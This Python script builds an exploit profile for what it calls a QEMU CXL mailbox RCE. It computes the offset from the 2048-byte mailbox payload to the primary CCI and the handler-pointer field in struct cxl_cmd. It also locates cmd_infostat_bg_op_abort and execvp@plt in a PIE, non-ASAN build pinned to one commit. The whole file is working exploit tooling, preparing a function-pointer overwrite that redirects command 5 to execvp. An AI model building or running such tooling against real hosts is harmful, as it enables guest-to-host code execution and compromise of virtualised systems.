#!/usr/bin/env python3
"""Derive exploit-relevant layout and symbol offsets from the built QEMU."""

from __future__ import annotations

import argparse
import datetime as dt
import hashlib
import json
import pathlib
import re
import subprocess
import sys


PINNED_COMMIT = "562bae590f194fb590beb5c65da44fc35ab9f64a"
KNOWN_HANDLER = "cmd_infostat_bg_op_abort"
TARGET_PLT = "execvp@plt"


def run_text(argv: list[str], *, check: bool = True) -> str:
    result = subprocess.run(
        argv,
        check=False,
        stdout=subprocess.PIPE,
        stderr=subprocess.PIPE,
        text=True,
    )
    if check and result.returncode != 0:
        raise RuntimeError(
            f"command failed ({result.returncode}): {' '.join(argv)}\n"
            f"{result.stderr[-2000:]}"
        )
    return result.stdout


def sha256_file(path: pathlib.Path) -> str:
    digest = hashlib.sha256()
    with path.open("rb") as handle:
        for chunk in iter(lambda: handle.read(1024 * 1024), b""):
            digest.update(chunk)
    return digest.hexdigest()


def parse_layout(probe: pathlib.Path) -> dict[str, int]:
    layout: dict[str, int] = {}
    for line in run_text([str(probe)]).splitlines():
        key, separator, value = line.partition("=")
        if not separator or not key or not value.isdecimal():
            raise RuntimeError(f"unexpected layout-probe output: {line!r}")
        layout[key] = int(value, 10)
    required = (
        "payload_to_primary_cci",
        "command_entry_bytes",
        "handler_field_offset",
    )
    missing = [key for key in required if key not in layout]
    if missing:
        raise RuntimeError("layout probe omitted: " + ", ".join(missing))
    if layout["payload_to_primary_cci"] <= 2048:
        raise RuntimeError("primary CCI does not follow the 2048-byte mailbox payload")
    if layout["handler_field_offset"] + 8 > layout["command_entry_bytes"]:
        raise RuntimeError("handler field does not fit in struct cxl_cmd")
    return layout


def find_nm_symbol(binary: pathlib.Path, symbol: str) -> int:
    process = subprocess.Popen(
        ["nm", "-an", str(binary)],
        stdout=subprocess.PIPE,
        stderr=subprocess.PIPE,
        text=True,
    )
    assert process.stdout is not None
    matches: list[int] = []
    for line in process.stdout:
        fields = line.strip().split(maxsplit=2)
        if len(fields) == 3 and fields[2] == symbol:
            try:
                matches.append(int(fields[0], 16))
            except ValueError:
                continue
    stderr = process.stderr.read() if process.stderr is not None else ""
    returncode = process.wait()
    if returncode != 0:
        raise RuntimeError(f"nm failed ({returncode}): {stderr[-2000:]}")
    if len(matches) != 1:
        raise RuntimeError(
            f"expected exactly one {symbol!r} symbol, found {len(matches)}"
        )
    return matches[0]


def find_plt_symbol(binary: pathlib.Path, symbol: str) -> int:
    pattern = re.compile(
        rf"^\s*([0-9a-fA-F]+)\s+<{re.escape(symbol)}>:\s*$",
        re.MULTILINE,
    )
    for section in (".plt.sec", ".plt"):
        output = run_text(
            ["objdump", "-d", "-j", section, str(binary)], check=False
        )
        match = pattern.search(output)
        if match:
            return int(match.group(1), 16)
    raise RuntimeError(f"could not locate {symbol!r} in .plt.sec or .plt")


def elf_profile(binary: pathlib.Path) -> tuple[bool, bool, str]:
    header = run_text(["readelf", "-h", str(binary)])
    pie = bool(re.search(r"^\s*Type:\s+DYN\b", header, re.MULTILINE))
    dynamic_symbols = run_text(["nm", "-D", str(binary)], check=False)
    asan = "__asan_" in dynamic_symbols
    return pie, asan, header


def main() -> int:
    parser = argparse.ArgumentParser()
    parser.add_argument("--qemu", type=pathlib.Path, required=True)
    parser.add_argument("--layout-probe", type=pathlib.Path, required=True)
    parser.add_argument("--source", type=pathlib.Path, required=True)
    parser.add_argument("--output", type=pathlib.Path, required=True)
    parser.add_argument("--expected-commit", default=PINNED_COMMIT)
    args = parser.parse_args()

    qemu = args.qemu.resolve()
    probe = args.layout_probe.resolve()
    source = args.source.resolve()
    for path in (qemu, probe):
        if not path.is_file():
            raise RuntimeError(f"required file is absent: {path}")

    commit = run_text([
        "git",
        "-c",
        f"safe.directory={source}",
        "-C",
        str(source),
        "rev-parse",
        "HEAD",
    ]).strip()
    if commit != args.expected_commit:
        raise RuntimeError(
            f"source commit mismatch: got {commit}, expected {args.expected_commit}"
        )

    layout = parse_layout(probe)
    handler_offset = find_nm_symbol(qemu, KNOWN_HANDLER)
    target_offset = find_plt_symbol(qemu, TARGET_PLT)
    pie, asan, _header = elf_profile(qemu)
    if not pie:
        raise RuntimeError("QEMU executable is not PIE (ELF type DYN required)")
    if asan:
        raise RuntimeError("QEMU executable imports ASAN; optimized non-ASAN required")

    version = run_text([str(qemu), "--version"]).splitlines()[0]
    profile = {
        "schema": "qemu-cxl-mailbox-rce-profile/v1",
        "generated_utc": dt.datetime.now(dt.timezone.utc).isoformat(),
        "build_profile": "optimized O2 PIE non-ASAN x86_64-softmmu",
        "qemu_commit": commit,
        "qemu_version": version,
        "qemu_binary": str(qemu),
        "qemu_sha256": sha256_file(qemu),
        "pie": pie,
        "asan": asan,
        "mailbox_payload_bytes": 2048,
        "payload_to_primary_cci": layout["payload_to_primary_cci"],
        "selected_command": 5,
        "command_entry_bytes": layout["command_entry_bytes"],
        "handler_field_offset": layout["handler_field_offset"],
        "known_handler_symbol": KNOWN_HANDLER,
        "known_handler_offset": handler_offset,
        "known_handler_offset_hex": hex(handler_offset),
        "target_symbol": TARGET_PLT,
        "target_symbol_offset": target_offset,
        "target_symbol_offset_hex": hex(target_offset),
        "layout": layout,
    }
    args.output.parent.mkdir(parents=True, exist_ok=True)
    args.output.write_text(json.dumps(profile, indent=2, sort_keys=True) + "\n")
    print(json.dumps(profile, indent=2, sort_keys=True))
    return 0


if __name__ == "__main__":
    try:
        raise SystemExit(main())
    except (OSError, RuntimeError, subprocess.SubprocessError) as error:
        print(f"profile derivation failed: {error}", file=sys.stderr)
        raise SystemExit(2)
